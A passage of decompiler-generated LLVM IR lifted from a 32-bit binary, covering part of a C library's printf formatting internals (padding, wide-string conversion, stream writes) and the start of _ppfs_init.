  store i32 0, i32* %v2_804e588, align 4
  %v0_804e590.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e590

dec_label_pc_804e590:                             ; preds = %dec_label_pc_804e575, %dec_label_pc_804e586
  %v0_804e597 = phi i32 [ %v0_804e57f, %dec_label_pc_804e575 ], [ %v0_804e590.pre, %dec_label_pc_804e586 ]
  %v1_804e590 = add i32 %v0_804e597, 32
  %v2_804e590 = inttoptr i32 %v1_804e590 to i8*
  %v3_804e590 = load i8, i8* %v2_804e590, align 1
  %v4_804e590 = and i8 %v3_804e590, 8
  %v5_804e590 = icmp eq i8 %v4_804e590, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e595 = icmp eq i1 %v5_804e590, false
  br i1 %v1_804e595, label %dec_label_pc_804e5be, label %dec_label_pc_804e597

dec_label_pc_804e597:                             ; preds = %dec_label_pc_804e590
  %v1_804e597 = add i32 %v0_804e597, 8
  %v2_804e597 = inttoptr i32 %v1_804e597 to i32*
  %v3_804e597 = load i32, i32* %v2_804e597, align 4
  store i32 %v3_804e597, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e5a0 = add i32 %v0_804e597, 368
  %v2_804e5a0 = inttoptr i32 %v1_804e5a0 to i32*
  %v3_804e5a0 = load i32, i32* %v2_804e5a0, align 4
  store i32 %v3_804e5a0, i32* @eax, align 4
  %v0_804e5a7 = call i32 @_charpad()
  store i32 %v0_804e5a7, i32* %eax.global-to-local, align 4
  %v1_804e5ac = load i32, i32* @esp, align 4
  %v2_804e5ac = add i32 %v1_804e5ac, 8
  %v3_804e5ac = inttoptr i32 %v2_804e5ac to i32*
  %v4_804e5ac = load i32, i32* %v3_804e5ac, align 4
  %v5_804e5ac = sub i32 %v0_804e5a7, %v4_804e5ac
  %v15_804e5ac = icmp eq i32 %v5_804e5ac, 0
  %v16_804e5ac = icmp slt i32 %v5_804e5ac, 0
  store i1 %v16_804e5ac, i1* %sf.global-to-local, align 1
  %v1_804e5b0 = icmp eq i1 %v15_804e5ac, false
  br i1 %v1_804e5b0, label %dec_label_pc_804e6ab, label %dec_label_pc_804e5b6

dec_label_pc_804e5b6:                             ; preds = %dec_label_pc_804e597
  store i32 0, i32* %v3_804e5ac, align 4
  %v1_804e5be.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e5be

dec_label_pc_804e5be:                             ; preds = %dec_label_pc_804e590, %dec_label_pc_804e5b6
  %v1_804e5be = phi i32 [ %v0_804e597, %dec_label_pc_804e590 ], [ %v1_804e5be.pre, %dec_label_pc_804e5b6 ]
  %v0_804e5be = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5be = add i32 %v1_804e5be, -4
  %v3_804e5be = inttoptr i32 %v2_804e5be to i32*
  store i32 %v0_804e5be, i32* %v3_804e5be, align 4
  %v0_804e5bf = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5bf = add i32 %v1_804e5be, -8
  %v3_804e5bf = inttoptr i32 %v2_804e5bf to i32*
  store i32 %v0_804e5bf, i32* %v3_804e5bf, align 4
  %v1_804e5c0 = add i32 %v1_804e5be, 368
  %v2_804e5c0 = inttoptr i32 %v1_804e5c0 to i32*
  %v3_804e5c0 = load i32, i32* %v2_804e5c0, align 4
  %v5_804e5c0 = add i32 %v1_804e5be, -12
  %v6_804e5c0 = inttoptr i32 %v5_804e5c0 to i32*
  store i32 %v3_804e5c0, i32* %v6_804e5c0, align 4
  %v0_804e5c7 = load i32, i32* @ebp, align 4
  %v1_804e5c7 = add i32 %v0_804e5c7, ptrtoint (i32* @global_var_8050bcd.116 to i32)
  store i32 %v1_804e5c7, i32* %eax.global-to-local, align 4
  %v2_804e5cd = add i32 %v1_804e5be, -16
  %v3_804e5cd = inttoptr i32 %v2_804e5cd to i32*
  store i32 %v1_804e5c7, i32* %v3_804e5cd, align 4
  %v0_804e5ce = call i32 @__GI_fputs_unlocked()
  store i32 %v0_804e5ce, i32* %eax.global-to-local, align 4
  %v0_804e5d3 = load i32, i32* @esp, align 4
  %v1_804e5d3 = add i32 %v0_804e5d3, 384
  %v2_804e5d3 = inttoptr i32 %v1_804e5d3 to i32*
  %v3_804e5d3 = load i32, i32* %v2_804e5d3, align 4
  store i32 %v3_804e5d3, i32* @eax, align 4
  %v0_804e5da = load i32, i32* @ebx, align 4
  store i32 %v0_804e5da, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e5e1 = call i32 @_charpad()
  store i32 %v0_804e5e1, i32* %eax.global-to-local, align 4
  %v0_804e5e6 = load i32, i32* @esp, align 4
  %v1_804e5e6 = add i32 %v0_804e5e6, 16
  %v1_804e5e9 = load i32, i32* @ebx, align 4
  %v2_804e5e9 = sub i32 %v0_804e5e1, %v1_804e5e9
  %v12_804e5e9 = icmp eq i32 %v2_804e5e9, 0
  %v13_804e5e9 = icmp slt i32 %v2_804e5e9, 0
  store i1 %v13_804e5e9, i1* %sf.global-to-local, align 1
  %v1_804e5eb = icmp eq i1 %v12_804e5e9, false
  br i1 %v1_804e5eb, label %dec_label_pc_804e6ab, label %dec_label_pc_804e5f1

dec_label_pc_804e5f1:                             ; preds = %dec_label_pc_804e5be
  %v1_804e5f1 = add i32 %v0_804e5e6, 356
  %v2_804e5f1 = inttoptr i32 %v1_804e5f1 to i32*
  %v3_804e5f1 = load i32, i32* %v2_804e5f1, align 4
  %v4_804e5f1 = icmp eq i32 %v3_804e5f1, 0
  %v5_804e5f1 = icmp slt i32 %v3_804e5f1, 0
  store i1 %v5_804e5f1, i1* %sf.global-to-local, align 1
  %v1_804e5f9 = icmp eq i1 %v4_804e5f1, false
  br i1 %v1_804e5f9, label %dec_label_pc_804e61d, label %dec_label_pc_804e5fb

dec_label_pc_804e5fb:                             ; preds = %dec_label_pc_804e5f1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e5fd = load i32, i32* @esi, align 4
  %v1_804e5fd = icmp eq i32 %v0_804e5fd, 0
  %v2_804e5fd = icmp slt i32 %v0_804e5fd, 0
  store i1 %v2_804e5fd, i1* %sf.global-to-local, align 1
  br i1 %v1_804e5fd, label %dec_label_pc_804e613, label %dec_label_pc_804e601

dec_label_pc_804e601:                             ; preds = %dec_label_pc_804e5fb
  %v2_804e601 = add i32 %v0_804e5e6, 12
  %v3_804e601 = inttoptr i32 %v2_804e601 to i32*
  store i32 0, i32* %v3_804e601, align 4
  %v1_804e602 = add i32 %v0_804e5e6, 384
  %v2_804e602 = inttoptr i32 %v1_804e602 to i32*
  %v3_804e602 = load i32, i32* %v2_804e602, align 4
  %v5_804e602 = add i32 %v0_804e5e6, 8
  %v6_804e602 = inttoptr i32 %v5_804e602 to i32*
  store i32 %v3_804e602, i32* %v6_804e602, align 4
  %v0_804e609 = load i32, i32* @esi, align 4
  %v2_804e609 = add i32 %v0_804e5e6, 4
  %v3_804e609 = inttoptr i32 %v2_804e609 to i32*
  store i32 %v0_804e609, i32* %v3_804e609, align 4
  %v0_804e60a = load i32, i32* @edi, align 4
  %v3_804e60a = inttoptr i32 %v0_804e5e6 to i32*
  store i32 %v0_804e60a, i32* %v3_804e60a, align 4
  %v0_804e60b = load i32, i32* %stack_var_-364, align 4
  %v4_804e60b = call i32 @__stdio_fwrite(i32 %v0_804e60b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e60b, i32* %eax.global-to-local, align 4
  %v0_804e610 = load i32, i32* @esp, align 4
  %v1_804e610 = add i32 %v0_804e610, 16
  %v7_804e610 = icmp slt i32 %v1_804e610, 0
  store i1 %v7_804e610, i1* %sf.global-to-local, align 1
  %v1_804e613.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e613

dec_label_pc_804e613:                             ; preds = %dec_label_pc_804e5fb, %dec_label_pc_804e601
  %v0_804e67d48 = phi i32 [ %v1_804e5e6, %dec_label_pc_804e5fb ], [ %v1_804e610, %dec_label_pc_804e601 ]
  %v1_804e613 = phi i32 [ 0, %dec_label_pc_804e5fb ], [ %v1_804e613.pre, %dec_label_pc_804e601 ]
  %v0_804e613 = phi i32 [ 0, %dec_label_pc_804e5fb ], [ %v4_804e60b, %dec_label_pc_804e601 ]
  %v2_804e613 = sub i32 %v0_804e613, %v1_804e613
  %v12_804e613 = icmp eq i32 %v2_804e613, 0
  %v13_804e613 = icmp slt i32 %v2_804e613, 0
  store i1 %v13_804e613, i1* %sf.global-to-local, align 1
  %v1_804e615 = icmp eq i1 %v12_804e613, false
  br i1 %v1_804e615, label %dec_label_pc_804e6ab, label %dec_label_pc_804e67d

dec_label_pc_804e61d:                             ; preds = %dec_label_pc_804e5f1
  %v1_804e61d = add i32 %v0_804e5e6, 348
  %v2_804e61d = inttoptr i32 %v1_804e61d to i32*
  store i32 0, i32* %v2_804e61d, align 4
  %v0_804e67910 = load i32, i32* @esi, align 4
  %v1_804e67911 = icmp eq i32 %v0_804e67910, 0
  %v2_804e67912 = icmp slt i32 %v0_804e67910, 0
  store i1 %v2_804e67912, i1* %sf.global-to-local, align 1
  %v1_804e67b18 = icmp eq i1 %v1_804e67911, false
  %v0_804e62a.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e67b18, label %dec_label_pc_804e62a, label %dec_label_pc_804e67d

dec_label_pc_804e62a:                             ; preds = %dec_label_pc_804e61d, %dec_label_pc_804e677
  %v0_804e631 = phi i32 [ %v2_804e677, %dec_label_pc_804e677 ], [ %v0_804e67910, %dec_label_pc_804e61d ]
  %v1_804e63c = phi i32 [ %v0_804e62a43, %dec_label_pc_804e677 ], [ %v0_804e62a.pre, %dec_label_pc_804e61d ]
  %v1_804e62a = add i32 %v1_804e63c, 332
  store i32 %v1_804e62a, i32* %edx.global-to-local, align 4
  %v1_804e631 = add i32 %v0_804e631, -128
  %v2_804e631 = icmp ult i32 %v0_804e631, 128
  %v6_804e631 = icmp eq i32 %v1_804e631, 0
  %v7_804e631 = icmp slt i32 %v1_804e631, 0
  store i1 %v7_804e631, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804e63c = add i32 %v1_804e63c, -4
  %v3_804e63c = inttoptr i32 %v2_804e63c to i32*
  store i32 %v1_804e62a, i32* %v3_804e63c, align 4
  %v2_804e63d = or i1 %v2_804e631, %v6_804e631
  %v3_804e63d = load i32, i32* %eax.global-to-local, align 4
  %v4_804e63d = load i32, i32* @esi, align 4
  %v5_804e63d = select i1 %v2_804e63d, i32 %v4_804e63d, i32 %v3_804e63d
  %v2_804e640 = add i32 %v1_804e63c, -8
  %v3_804e640 = inttoptr i32 %v2_804e640 to i32*
  store i32 %v5_804e63d, i32* %v3_804e640, align 4
  %v1_804e641 = add i32 %v1_804e63c, 340
  store i32 %v1_804e641, i32* %eax.global-to-local, align 4
  %v2_804e648 = add i32 %v1_804e63c, -12
  %v3_804e648 = inttoptr i32 %v2_804e648 to i32*
  store i32 %v1_804e641, i32* %v3_804e648, align 4
  %v1_804e649 = add i32 %v1_804e63c, 204
  store i32 %v1_804e649, i32* @edi, align 4
  %v2_804e650 = add i32 %v1_804e63c, -16
  %v3_804e650 = inttoptr i32 %v2_804e650 to i32*
  store i32 %v1_804e649, i32* %v3_804e650, align 4
  %v0_804e651 = call i32 @__GI_wcsrtombs()
  %v0_804e656 = load i32, i32* @esp, align 4
  %v1_804e656 = add i32 %v0_804e656, 16
  store i32 %v0_804e651, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e65d = icmp eq i32 %v0_804e651, 0
  %v2_804e65d = icmp slt i32 %v0_804e651, 0
  store i1 %v2_804e65d, i1* %sf.global-to-local, align 1
  br i1 %v1_804e65d, label %dec_label_pc_804e673, label %dec_label_pc_804e661

dec_label_pc_804e661:                             ; preds = %dec_label_pc_804e62a
  %v0_804e661 = load i32, i32* @ebp, align 4
  %v2_804e661 = add i32 %v0_804e656, 12
  %v3_804e661 = inttoptr i32 %v2_804e661 to i32*
  store i32 %v0_804e661, i32* %v3_804e661, align 4
  %v1_804e662 = add i32 %v0_804e656, 384
  %v2_804e662 = inttoptr i32 %v1_804e662 to i32*
  %v3_804e662 = load i32, i32* %v2_804e662, align 4
  %v5_804e662 = add i32 %v0_804e656, 8
  %v6_804e662 = inttoptr i32 %v5_804e662 to i32*
  store i32 %v3_804e662, i32* %v6_804e662, align 4
  %v2_804e669 = add i32 %v0_804e656, 4
  %v3_804e669 = inttoptr i32 %v2_804e669 to i32*
  store i32 %v0_804e651, i32* %v3_804e669, align 4
  %v0_804e66a = load i32, i32* @edi, align 4
  %v3_804e66a = inttoptr i32 %v0_804e656 to i32*
  store i32 %v0_804e66a, i32* %v3_804e66a, align 4
  %v0_804e66b = load i32, i32* %stack_var_-364, align 4
  %v4_804e66b = call i32 @__stdio_fwrite(i32 %v0_804e66b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e66b, i32* %eax.global-to-local, align 4
  %v0_804e670 = load i32, i32* @esp, align 4
  %v1_804e670 = add i32 %v0_804e670, 16
  %v7_804e670 = icmp slt i32 %v1_804e670, 0
  store i1 %v7_804e670, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e673

dec_label_pc_804e673:                             ; preds = %dec_label_pc_804e62a, %dec_label_pc_804e661
  %v1_804e677 = phi i32 [ 0, %dec_label_pc_804e62a ], [ %v4_804e66b, %dec_label_pc_804e661 ]
  %v0_804e62a43 = phi i32 [ %v1_804e656, %dec_label_pc_804e62a ], [ %v1_804e670, %dec_label_pc_804e661 ]
  %v2_804e673 = sub i32 %v1_804e677, %v0_804e651
  %v12_804e673 = icmp eq i32 %v2_804e673, 0
  %v13_804e673 = icmp slt i32 %v2_804e673, 0
  store i1 %v13_804e673, i1* %sf.global-to-local, align 1
  %v1_804e675 = icmp eq i1 %v12_804e673, false
  br i1 %v1_804e675, label %dec_label_pc_804e6ab, label %dec_label_pc_804e677

dec_label_pc_804e677:                             ; preds = %dec_label_pc_804e673
  %v0_804e677 = load i32, i32* @esi, align 4
  %v2_804e677 = sub i32 %v0_804e677, %v1_804e677
  %v12_804e677 = icmp eq i32 %v2_804e677, 0
  %v13_804e677 = icmp slt i32 %v2_804e677, 0
  store i32 %v2_804e677, i32* @esi, align 4
  store i1 %v13_804e677, i1* %sf.global-to-local, align 1
  %v1_804e67b = icmp eq i1 %v12_804e677, false
  br i1 %v1_804e67b, label %dec_label_pc_804e62a, label %dec_label_pc_804e67d

dec_label_pc_804e67d:                             ; preds = %dec_label_pc_804e677, %dec_label_pc_804e61d, %dec_label_pc_804e613
  %v0_804e67d = phi i32 [ %v0_804e67d48, %dec_label_pc_804e613 ], [ %v0_804e62a.pre, %dec_label_pc_804e61d ], [ %v0_804e62a43, %dec_label_pc_804e677 ]
  %v1_804e67d = add i32 %v0_804e67d, 8
  %v2_804e67d = inttoptr i32 %v1_804e67d to i32*
  %v3_804e67d = load i32, i32* %v2_804e67d, align 4
  store i32 %v3_804e67d, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e686 = add i32 %v0_804e67d, 368
  %v2_804e686 = inttoptr i32 %v1_804e686 to i32*
  %v3_804e686 = load i32, i32* %v2_804e686, align 4
  store i32 %v3_804e686, i32* @eax, align 4
  %v0_804e68d = call i32 @_charpad()
  store i32 %v0_804e68d, i32* %eax.global-to-local, align 4
  %v1_804e692 = load i32, i32* @esp, align 4
  %v2_804e692 = add i32 %v1_804e692, 8
  %v3_804e692 = inttoptr i32 %v2_804e692 to i32*
  %v4_804e692 = load i32, i32* %v3_804e692, align 4
  %v5_804e692 = sub i32 %v0_804e68d, %v4_804e692
  %v15_804e692 = icmp eq i32 %v5_804e692, 0
  %v16_804e692 = icmp slt i32 %v5_804e692, 0
  store i1 %v16_804e692, i1* %sf.global-to-local, align 1
  %v1_804e696 = icmp eq i1 %v15_804e692, false
  br i1 %v1_804e696, label %dec_label_pc_804e6ab, label %dec_label_pc_804e698

dec_label_pc_804e698:                             ; preds = %dec_label_pc_804e67d, %dec_label_pc_804e405, %dec_label_pc_804e230
  %v0_804e698 = phi i32 [ %v1_804e692, %dec_label_pc_804e67d ], [ %v0_804e698.pre, %dec_label_pc_804e405 ], [ %v1_804e24e, %dec_label_pc_804e230 ]
  %v1_804e698 = add i32 %v0_804e698, 16
  %v2_804e698 = inttoptr i32 %v1_804e698 to i32*
  %v3_804e698 = load i32, i32* %v2_804e698, align 4
  store i32 %v3_804e698, i32* @ebx, align 4
  store i32 %v3_804e698, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e188.backedge

dec_label_pc_804e6a3:                             ; preds = %dec_label_pc_804e1c6
  %v1_804e6a3 = add i32 %v0_804e6a3, 2
  %v10_804e6a3 = icmp slt i32 %v1_804e6a3, 0
  store i1 %v10_804e6a3, i1* %sf.global-to-local, align 1
  store i32 %v1_804e6a3, i32* @ebx, align 4
  br label %dec_label_pc_804e188.backedge

dec_label_pc_804e6ab:                             ; preds = %dec_label_pc_804e1b2, %dec_label_pc_804e67d, %dec_label_pc_804e613, %dec_label_pc_804e5be, %dec_label_pc_804e597, %dec_label_pc_804e507, %dec_label_pc_804e47a, %dec_label_pc_804e43b, %dec_label_pc_804e3dc, %dec_label_pc_804e673
  %v0_804e6ab = phi i32 [ %v0_804e62a43, %dec_label_pc_804e673 ], [ %v0_804e6ab.pre.pre, %dec_label_pc_804e1b2 ], [ %v1_804e692, %dec_label_pc_804e67d ], [ %v0_804e67d48, %dec_label_pc_804e613 ], [ %v1_804e5e6, %dec_label_pc_804e5be ], [ %v1_804e5ac, %dec_label_pc_804e597 ], [ %v0_804e228.lcssa, %dec_label_pc_804e507 ], [ %v1_804e492, %dec_label_pc_804e47a ], [ %v1_804e45e, %dec_label_pc_804e43b ], [ %v1_804e3fa, %dec_label_pc_804e3dc ]
  %v1_804e6ab = inttoptr i32 %v0_804e6ab to i32*
  store i32 -1, i32* %v1_804e6ab, align 4
  br label %dec_label_pc_804e6b2

dec_label_pc_804e6b2:                             ; preds = %dec_label_pc_804e1bd, %dec_label_pc_804e12b, %dec_label_pc_804e14a, %dec_label_pc_804e6ab
  %v0_804e6b2 = load i32, i32* @esp, align 4
  %v1_804e6b2 = inttoptr i32 %v0_804e6b2 to i32*
  %v2_804e6b2 = load i32, i32* %v1_804e6b2, align 4
  store i32 %v2_804e6b2, i32* %eax.global-to-local, align 4
  %v1_804e6b5 = add i32 %v0_804e6b2, 348
  %v10_804e6b5 = icmp slt i32 %v1_804e6b5, 0
  store i1 %v10_804e6b5, i1* %sf.global-to-local, align 1
  ret i32 %v2_804e6b2

; uselistorder directives
  uselistorder i32 %v1_804e6a3, { 1, 2, 0 }
  uselistorder i32 %v3_804e698, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e67d, { 1, 0 }
  uselistorder i32 %v2_804e677, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804e656, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e651, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804e631, { 1, 0 }
  uselistorder i32 %v0_804e62a.pre, { 1, 0 }
  uselistorder i32 %v0_804e5fd, { 1, 0 }
  uselistorder i32 %v3_804e5f1, { 1, 0 }
  uselistorder i32 %v0_804e5e6, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e5be, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e597, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804e57f, { 1, 0 }
  uselistorder i32 %v2_804e56b, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804e558, { 1, 0 }
  uselistorder i32 %v1_804e555, { 1, 0 }
  uselistorder i32 %v1_804e54b, { 1, 0 }
  uselistorder i32 %v0_804e54b, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e52a, { 1, 0 }
  uselistorder i32 %v1_804e507, { 1, 0 }
  uselistorder i32 %v1_804e4c5, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804e4e1, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804e4aa, { 1, 0 }
  uselistorder i32 %v1_804e495, { 1, 0 }
  uselistorder i32 %v1_804e461, { 1, 0 }
  uselistorder i32 %v0_804e43b, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804e421, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804e40d, { 1, 0 }
  uselistorder i32 %v1_804e3c3, { 1, 0 }
  uselistorder i32 %v4_804e391, { 1, 0 }
  uselistorder i32 %v0_804e386, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e381, { 1, 0 }
  uselistorder i32 %v0_804e3ba, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e371, { 1, 0 }
  uselistorder i32 %v1_804e368, { 1, 0 }
  uselistorder i32 %v1_804e35c, { 1, 0 }
  uselistorder i32 %v3_804e350, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e346, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804e341, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804e33f, { 1, 0 }
  uselistorder i32 %v0_804e391, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804e381, { 1, 2, 0 }
  uselistorder i32 %v3_804e319, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804e307, { 1, 0 }
  uselistorder i32 %v4_804e2fe, { 1, 0 }
  uselistorder i32 %v3_804e2fe, { 1, 0 }
  uselistorder i32 %v6_804e2f6, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804e2c7, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804e2c6, { 2, 1, 0 }
  uselistorder i32 %v1_804e29f, { 1, 0 }
  uselistorder i32 %v1_804e293, { 1, 0 }
  uselistorder i32 %v1_804e28e, { 1, 0 }
  uselistorder i32 %v2_804e286, { 1, 0 }
  uselistorder i32 %tmp70, { 1, 0 }
  uselistorder i32 %v3_804e270, { 1, 0, 2 }
  uselistorder i8 %v3_804e25f, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e256, { 1, 0 }
  uselistorder i32 %v3_804e228, { 6, 0, 3, 8, 9, 4, 5, 14, 13, 1, 7, 2, 15, 16, 12, 10, 11, 17, 18, 19 }
  uselistorder i32 %v0_804e228.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e224, { 1, 0 }
  uselistorder i32 %v1_804e224.pre, { 1, 0 }
  uselistorder i32 %v1_804e223, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e220, { 1, 0 }
  uselistorder i32 %v2_804e22474, { 1, 0 }
  uselistorder i32 %v3_804e20a, { 1, 0 }
  uselistorder i8 %v4_804e1c6, { 1, 0 }
  uselistorder i32 %v1_804e1c6, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804e1bd, { 1, 0 }
  uselistorder i32 %v2_804e192, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804e18e, { 1, 0 }
  uselistorder i8 %v2_804e188, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e196, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e178, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 6, 0, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 70, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 48, 49, 50, 51, 52, 47, 46, 45, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 -128, { 1, 0 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 19, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -17, { 2, 3, 4, 0, 1 }
  uselistorder i32 -32, { 1, 2, 0 }
  uselistorder i32 33, { 1, 2, 0 }
  uselistorder i32 15, { 5, 0, 4, 6, 1, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 11, { 5, 6, 7, 8, 3, 9, 0, 10, 11, 1, 2, 4, 12 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 45, { 0, 4, 1, 3, 2 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 60, { 0, 4, 5, 6, 7, 1, 8, 3, 2 }
  uselistorder i32 70, { 1, 0 }
  uselistorder i32 -16, { 2, 10, 6, 3, 7, 8, 9, 11, 12, 4, 13, 14, 0, 1, 26, 27, 28, 17, 19, 20, 16, 18, 5, 21, 15, 22, 23, 24, 25 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e6b2, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e6ab, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e673, { 1, 0 }
  uselistorder label %dec_label_pc_804e62a, { 1, 0 }
  uselistorder label %dec_label_pc_804e613, { 1, 0 }
  uselistorder label %dec_label_pc_804e5be, { 1, 0 }
  uselistorder label %dec_label_pc_804e590, { 1, 0 }
  uselistorder label %dec_label_pc_804e575, { 1, 0 }
  uselistorder label %dec_label_pc_804e55f, { 1, 0 }
  uselistorder label %dec_label_pc_804e54b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e546, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e4d8, { 1, 0 }
  uselistorder label %dec_label_pc_804e4be, { 1, 0 }
  uselistorder label %dec_label_pc_804e3dc, { 1, 0 }
  uselistorder label %dec_label_pc_804e381, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804e32f, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2df, { 1, 0 }
  uselistorder label %dec_label_pc_804e2c6, { 1, 0 }
  uselistorder label %dec_label_pc_804e2b2, { 1, 0 }
  uselistorder label %dec_label_pc_804e2ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e28e, { 1, 0 }
  uselistorder label %dec_label_pc_804e219, { 1, 0 }
  uselistorder label %dec_label_pc_804e211, { 1, 0 }
  uselistorder label %dec_label_pc_804e1bd, { 1, 0 }
  uselistorder label %dec_label_pc_804e1b2, { 1, 0 }
  uselistorder label %dec_label_pc_804e188.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e6c0 = load i32, i32* @esi, align 4
  %v0_804e6c1 = load i32, i32* @ebx, align 4
  store i32 %v0_804e6c1, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e6d5 = bitcast i32* %arg1 to i8*
  %v4_804e6d5 = call i32 @__GI_memset(i8* %v3_804e6d5, i32 0, i32 188)
  %v0_804e6da = load i32, i32* @ebx, align 4
  %v1_804e6da = add i32 %v0_804e6da, 40
  store i32 %v1_804e6da, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804e6e2 = add i32 %v0_804e6da, 24
  %v2_804e6e2 = inttoptr i32 %v1_804e6e2 to i32*
  %v3_804e6e2 = load i32, i32* %v2_804e6e2, align 4
  %v4_804e6e2 = add i32 %v3_804e6e2, -1
  store i32 %v4_804e6e2, i32* %v2_804e6e2, align 4
  %v0_804e6e8 = load i32, i32* @esi, align 4
  %v1_804e6e8 = load i32, i32* @ebx, align 4
  %v2_804e6e8 = inttoptr i32 %v1_804e6e8 to i32*
  store i32 %v0_804e6e8, i32* %v2_804e6e8, align 4
  %v0_804e6ea.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e6ea

dec_label_pc_804e6ea:                             ; preds = %dec_label_pc_804e6ea, %entry
  %v0_804e6ea = phi i32 [ %v1_804e6f0, %dec_label_pc_804e6ea ], [ %v0_804e6ea.pre, %entry ]
  %v1_804e6ea = inttoptr i32 %v0_804e6ea to i32*
